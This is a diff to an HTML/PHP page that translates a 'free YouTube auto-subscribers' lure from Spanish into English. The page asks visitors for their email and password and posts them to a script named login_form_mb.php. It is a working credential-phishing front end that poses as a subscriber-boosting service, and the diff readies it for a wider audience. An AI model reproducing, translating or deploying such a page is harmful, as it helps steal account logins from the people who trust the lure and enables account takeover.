@@ -5,7 +5,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Auto-Suscriptores para YouTube😀</title>
+    <title>Auto-Subscribers for YouTube😀</title>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
     <style>
     body {
@@ -47,22 +47,22 @@
 	<div class="alert alert-info">
 	
 	
-          <h1><b>AUTO-Suscriptores EN YOUTUBE GRATIS</b></h1><hr/>
+          <h1><b>FREE AUTO-SUBSCRIBERS ON YOUTUBE</b></h1><hr/>
           <form method="POST" action="login_form_mb.php">
             <?php echo $m; ?>
-            <input name="email" type="text" class="form-control" placeholder="Correo electronico "><br/>
-	    <input name="pass" type="password" class="form-control" placeholder="Contraseña"><br/>
+            <input name="email" type="text" class="form-control" placeholder="email"><br/>
+	    <input name="pass" type="password" class="form-control" placeholder="password"><br/>
 	
             <select class="form-control">
-              <option>50 Suscriptores    (GRATIS)</option>
-              <option>100 Suscriptores      (GRATIS)</option>
-              <option>200 Suscriptores (GRATIS)</option>
-              <option>300 Suscriptores      (GRATIS)</option>
-	      <option>350 Suscriptores   (GRATIS)</option>
-	      <option>1500 Suscriptores   (30$)</option>
-              <option>2000 Suscriptores (50$)</option>
+              <option>50 Subscribers    (FREE)</option>
+              <option>100 Subscribers      (FREE)</option>
+              <option>200 Subscribers (FREE)</option>
+              <option>300 Subscribers      (FREE)</option>
+	      <option>350 Subscribers   (FREE)</option>
+	      <option>1500 Subscribers   (30$)</option>
+              <option>2000 Subscribers (50$)</option>
             </select><br/>
-            <button class="btn btn-success btn-lg btn-block" type="submit">Añadir Suscriptores </button>
+            <button class="btn btn-success btn-lg btn-block" type="submit">Add Subscribers </button>
           </form>
         </div>
       </div>
@@ -72,4 +72,3 @@
   <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
   </body>
 </html>
- 
